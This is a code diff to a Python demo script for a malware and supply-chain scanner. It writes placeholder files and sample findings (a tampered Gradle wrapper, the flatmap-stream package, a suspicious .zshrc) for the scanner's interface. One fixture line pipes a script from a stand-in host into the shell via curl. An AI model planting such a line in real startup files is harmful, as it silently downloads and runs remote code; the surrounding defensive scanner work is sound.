@@ -92,23 +92,45 @@ def demo_scan() -> dict:
     }
 
 
+RC_LINE = "curl -fsSL https://update-check.example/install.sh | sh"
+
+
+def demo_files() -> None:
+    """The files the demo malware findings point at, so the app offers its real actions for them."""
+    files = {
+        ".zshrc": f'export PATH="$HOME/bin:$PATH"\n{RC_LINE}\n',
+        "code/android-app/gradle/wrapper/gradle-wrapper.jar": "not a real jar",
+        "code/android-app/gradle/wrapper/gradle-wrapper.properties":
+            "distributionUrl=https\\://services.gradle.org/distributions/gradle-8.13-bin.zip\n",
+        "code/webshop/node_modules/flatmap-stream/index.min.js": "/* demo */",
+        "code/webshop/.github/workflows/release.yml":
+            "jobs:\n  r:\n    steps:\n      - uses: tj-actions/changed-files@v45\n      - uses: actions/setup-node@v4\n",
+    }
+    for rel, text in files.items():
+        (TMP / rel).parent.mkdir(parents=True, exist_ok=True)
+        (TMP / rel).write_text(text)
+
+
 def demo_malware() -> dict:
-    def f(check, sev, title, path, advice, evidence=(), rules=(), quarantinable=False):
+    def f(check, sev, title, path, advice, evidence=(), rules=(), quarantinable=False, meta=None):
         return {"check": check, "severity": sev, "title": title, "path": path, "evidence": list(evidence),
-                "rules": list(rules), "advice": advice, "quarantinable": quarantinable, "new": True, "meta": {}}
+                "rules": list(rules), "advice": advice, "quarantinable": quarantinable, "new": True, "meta": meta or {}}
     return {
         "kind": "malware", "scs_version": "0.1.0", "host": "demo-mac", "started": "2026-10-27T09:01:40+07:00",
         "duration_s": 12.4, "checks": ["packages", "buildchain", "persistence", "extensions", "exposure"],
         "has_baseline": True, "stats": {}, "ignored": [], "inventory": {}, "yara_rules": [],
-        "counts": {"critical": 1, "high": 1, "medium": 0, "low": 1, "info": 0},
+        "counts": {"critical": 1, "high": 2, "medium": 0, "low": 1, "info": 0},
         "findings": [
             f("buildchain", "critical", "Gradle wrapper jar does not match any Gradle release",
               f"{H}/code/android-app/gradle/wrapper/gradle-wrapper.jar",
               "Don't run ./gradlew in this project. Check how it changed (git log -p -- gradle/wrapper/gradle-wrapper.jar), "
               "then restore it from a trusted commit or regenerate it with a Gradle you installed yourself: gradle wrapper.",
               ["sha256 9f2c1e…"], ["GRADLE_WRAPPER_MISMATCH"], True),
+            f("persistence", "high", ".zshrc line 12", f"{H}/.zshrc",
+              "Shell start-up files run in every terminal. Remove the line if you did not add it.",
+              [f"REMOTE_PIPE_SHELL: downloads and runs a script — {RC_LINE}"], ["REMOTE_PIPE_SHELL"], meta={"line": RC_LINE}),
             f("packages", "high", "install script of flatmap-stream runs downloaded code",
-              f"{H}/code/webshop/node_modules/flatmap-stream/index.min.js",
+              f"{H}/code/webshop/node_modules/flatmap-stream",
               "Install-time code runs with your user's rights. Remove the package and reinstall from a clean lockfile "
               "with --ignore-scripts, then rotate tokens listed under Exposure.",
               ["EVAL_DECODE: decodes and evaluates a payload", "SECRET_TOOLING: reads wallet / credential files"],
@@ -134,6 +156,7 @@ def main() -> int:
     (TMP / ".config" / "scs").mkdir(parents=True, exist_ok=True)
     write_json(TMP / ".config" / "scs" / "config.json", {"roots": ["~/code"]})
     history.save(demo_scan())
+    demo_files()
     (data_dir() / "malware-latest.json").write_text(json.dumps(demo_malware()), encoding="utf-8")
     httpd, _, url = serve(port=0)
     print(f"demo UI: {url}")
